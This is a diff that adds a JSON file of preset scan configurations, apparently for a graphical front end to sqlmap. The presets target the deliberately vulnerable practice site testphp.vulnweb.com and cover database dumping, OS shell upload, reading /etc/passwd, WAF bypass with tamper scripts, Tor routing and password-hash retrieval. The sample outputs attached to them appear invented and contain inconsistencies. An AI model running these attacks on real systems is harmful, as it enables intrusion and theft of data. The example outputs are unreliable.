@@ -1,0 +1,267 @@
+[
+    {
+        "name": "Basic Scan (GET Parameter)",
+        "description": "Scans a target URL with a vulnerable GET parameter for SQL injection.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "level_entry": "1",
+            "risk_entry": "1",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] fetched data: 'admin'\n[INFO] retrieved: 'testdb'\n[INFO] retrieved: 'users'\nWeb server operating system: Linux\nWeb application technology: PHP 5.x, Apache 2.x\nback-end DBMS: MySQL >= 5.0.12\n[SUCCESS] GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Scan with POST Data",
+        "description": "Scans a target URL with vulnerable POST data.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/userinfo.php",
+            "data_entry": "uname=test&pass=test",
+            "level_entry": "1",
+            "risk_entry": "1",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] retrieved: 'testdb'\n[INFO] retrieved: 'users'\nWeb server operating system: Linux\nWeb application technology: PHP 5.x, Apache 2.x\nback-end DBMS: MySQL >= 5.0.12\n[SUCCESS] POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Dump Databases",
+        "description": "Enumerates and dumps all accessible databases.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "dbs_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\navailable databases [2]:\n[*] acuart\n[*] information_schema\n[SUCCESS] retrieved database names"
+    },
+    {
+        "name": "Dump Tables from a Database",
+        "description": "Enumerates and dumps tables from a specified database.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "db_name_entry": "acuart",
+            "tables_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\nDatabase: acuart\n[25 tables]\n+--------------+\n| artists      |\n| carts        |\n| categories   |\n| guestbook    |\n| pictures     |\n| products     |\n| users        |\n+--------------+\n[SUCCESS] retrieved table names for database 'acuart'"
+    },
+    {
+        "name": "Dump Columns from a Table",
+        "description": "Enumerates and dumps columns from a specified table within a database.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "db_name_entry": "acuart",
+            "table_name_entry": "users",
+            "columns_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\nDatabase: acuart\nTable: users\n[10 columns]\n+-----------+-------------+\n| Column    | Type        |\n+-----------+-------------+\n| cid       | int(11)     |\n| email     | varchar(50) |\n| uname     | varchar(20) |\n| passwd    | varchar(20) |\n| cc        | varchar(20) |\n| address   | varchar(50) |\n| phone     | varchar(20) |\n| name      | varchar(50) |\n| cart      | int(11)     |\n| id        | int(11)     |\n+-----------+-------------+\n[SUCCESS] retrieved column names for table 'users' in database 'acuart'"
+    },
+    {
+        "name": "Dump Data from a Table",
+        "description": "Dumps all entries from a specified table.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "db_name_entry": "acuart",
+            "table_name_entry": "users",
+            "dump_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\nDatabase: acuart\nTable: users\n[1 entry]\n+----+-------+----------+----------+------------+--------------------------+------------+----------+------+\n| id | uname | passwd   | email    | name       | address                  | phone      | cc       | cart |\n+----+-------+----------+----------+------------+--------------------------+------------+----------+------+\n| 1  | test  | test     | test@test.com | John Doe   | 123 Main St              | 555-1234   | 1234-5678-9012-3456 | 0    |\n+----+-------+----------+----------+------------+--------------------------+------------+----------+------+\n[SUCCESS] retrieved 1 entry for table 'users' in database 'acuart'"
+    },
+    {
+        "name": "Current User and Database",
+        "description": "Retrieves the current database user and database name.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "current_user_var": true,
+            "current_db_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\ncurrent user: 'root@localhost'\ncurrent database: 'acuart'\n[SUCCESS] retrieved current user and database"
+    },
+    {
+        "name": "OS Shell Access",
+        "description": "Attempts to gain an interactive OS shell on the target system.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "os_shell_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] web server is Linux\n[INFO] attempting to upload a shell...\n[SUCCESS] shell uploaded to '/var/www/html/shell.php'\n[INFO] spawning a pseudo-terminal...\n[SUCCESS] OS shell is available. Type 'exit' to quit.\nsqlmap> ls -la\ntotal 20\ndrwxr-xr-x 5 www-data www-data 4096 Jul 29 10:00 .\ndrwxr-xr-x 3 root     root     4096 Jul 29 09:50 ..\n-rw-r--r-- 1 www-data www-data   100 Jul 29 10:00 shell.php\n-rw-r--r-- 1 www-data www-data  1234 Jul 29 09:55 index.php\nsqlmap> exit"
+    },
+    {
+        "name": "Read File from System",
+        "description": "Reads a specified file from the target's file system.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "file_read_entry": "/etc/passwd",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] attempting to read file '/etc/passwd'\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev/null:/usr/sbin/nologin\n...\n[SUCCESS] file '/etc/passwd' successfully retrieved"
+    },
+    {
+        "name": "WAF Bypass (Tamper Script)",
+        "description": "Uses a tamper script to bypass WAF/IDS during scanning.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "tamper_scripts_entry": "space2plus",
+            "level_entry": "3",
+            "risk_entry": "3",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] WAF/IPS/IDS detected (ModSecurity)\n[INFO] using tamper script 'space2plus'\n[INFO] the back-end DBMS is MySQL\n[SUCCESS] GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Custom User-Agent",
+        "description": "Sets a custom User-Agent header for requests.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "user_agent_entry": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] fetched data: 'admin'\n[SUCCESS] GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Scan with HTTP Headers",
+        "description": "Includes custom HTTP headers in the requests.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "headers_entry": "X-Forwarded-For: 127.0.0.1\nAccept-Language: en-US",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] fetched data: 'admin'\n[SUCCESS] GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Scan with Cookie",
+        "description": "Includes a custom Cookie header in the requests.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "cookie_entry": "PHPSESSID=abcdef1234567890; security=low",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] fetched data: 'admin'\n[SUCCESS] GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Scan with Tor Proxy",
+        "description": "Routes all traffic through the Tor network for anonymity.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "tor_var": true,
+            "tor_type_entry": "SOCKS5",
+            "tor_port_entry": "9050",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] connecting to Tor proxy at 127.0.0.1:9050\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] fetched data: 'admin'\n[SUCCESS] GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Scan with Specific Techniques",
+        "description": "Tests for specific SQL injection techniques (e.g., Error-based, Time-based).",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "techniques_entry": "E,T",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] testing connection to the target URL\n[INFO] testing error-based SQL injection\n[INFO] testing time-based blind SQL injection\n[SUCCESS] GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Scan with Risk 3 and Level 5",
+        "description": "Performs a deep and aggressive scan, potentially causing more traffic and false positives.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "level_entry": "5",
+            "risk_entry": "3",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] fetched data: 'admin'\n[INFO] retrieved: 'testdb'\n[INFO] retrieved: 'users'\n[SUCCESS] GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N/q] N"
+    },
+    {
+        "name": "Dump All Data",
+        "description": "Dumps all databases, tables, columns, and entries.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "dump_all_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] fetched data: 'admin'\n[INFO] retrieved: 'testdb'\n[INFO] retrieved: 'users'\nDatabase: acuart\nTable: users\n[1 entry]\n+----+-------+----------+----------+------------+--------------------------+------------+----------+------+\n| id | uname | passwd   | email    | name       | address                  | phone      | cc       | cart |\n+----+-------+----------+----------+------------+--------------------------+------------+----------+------+\n| 1  | test  | test     | test     | John Doe   | 123 Main St              | 555-1234   | 1234-5678-9012-3456 | 0    |\n+----+-------+----------+----------+------------+--------------------------+------------+----------+------+\n[SUCCESS] all data successfully retrieved"
+    },
+    {
+        "name": "Check for WAF",
+        "description": "Identifies if the target is protected by a Web Application Firewall (WAF).",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "check_waf_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] WAF/IPS/IDS detected (ModSecurity)\n[SUCCESS] WAF detected"
+    },
+    {
+        "name": "Scan from Request File",
+        "description": "Loads HTTP request from a local file for scanning.",
+        "options": {
+            "request_file_entry": "request.txt",
+            "batch_var": true
+        },
+        "example_output": "[INFO] parsing HTTP request from 'request.txt'\n[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[SUCCESS] GET parameter 'id' is vulnerable."
+    },
+    {
+        "name": "Enumerate Users and Passwords",
+        "description": "Retrieves database users and their password hashes.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "users_var": true,
+            "passwords_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\nDatabase: acuart\n[1 user]\n[*] root\n[SUCCESS] retrieved database users\n[INFO] retrieving password hashes for user 'root'\n[INFO] retrieved: 'root: *A4BB286C32B1F7220B876523F46554F7F20D32F4'\n[SUCCESS] retrieved password hashes"
+    },
+    {
+        "name": "Crawl and Scan",
+        "description": "Crawls the target website to discover URLs and then scans them.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/",
+            "crawl_entry": "1",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] crawling website 'http://testphp.vulnweb.com/' with depth 1\n[INFO] found 15 links\n[INFO] testing parameter 'cat' on 'http://testphp.vulnweb.com/listproducts.php?cat=1'\n[SUCCESS] GET parameter 'cat' is vulnerable."
+    },
+    {
+        "name": "Scan with Delay and Threads",
+        "description": "Sets a delay between requests and uses multiple threads for faster scanning.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "delay_entry": "1",
+            "threads_entry": "5",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 5 threads\n[INFO] setting delay to 1 second\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[SUCCESS] GET parameter 'cat' is vulnerable."
+    },
+    {
+        "name": "Save Output to File",
+        "description": "Scans and saves the output to a specified file.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "output_dir_entry": "sqlmap_results",
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[SUCCESS] GET parameter 'cat' is vulnerable.\n[INFO] output saved to '/path/to/sqlmap_results/testphp.vulnweb.com/log'"
+    },
+    {
+        "name": "Fingerprint DBMS",
+        "description": "Attempts to fingerprint the database management system.",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "fingerprint_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] fingerprinting the back-end DBMS\n[SUCCESS] back-end DBMS: MySQL >= 5.0.12"
+    },
+    {
+        "name": "Enumerate Schema",
+        "description": "Enumerates the database schema (databases, tables, columns, users, passwords, privileges, roles).",
+        "options": {
+            "target_url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "schema_var": true,
+            "batch_var": true
+        },
+        "example_output": "[INFO] starting 10 threads\n[INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[INFO] the back-end DBMS is MySQL\n[INFO] retrieved database names\n[INFO] retrieved table names for database 'acuart'\n[INFO] retrieved column names for table 'users' in database 'acuart'\n[INFO] retrieved database users\n[INFO] retrieved password hashes\n[INFO] retrieved database privileges\n[SUCCESS] schema successfully enumerated"
+    }
+]
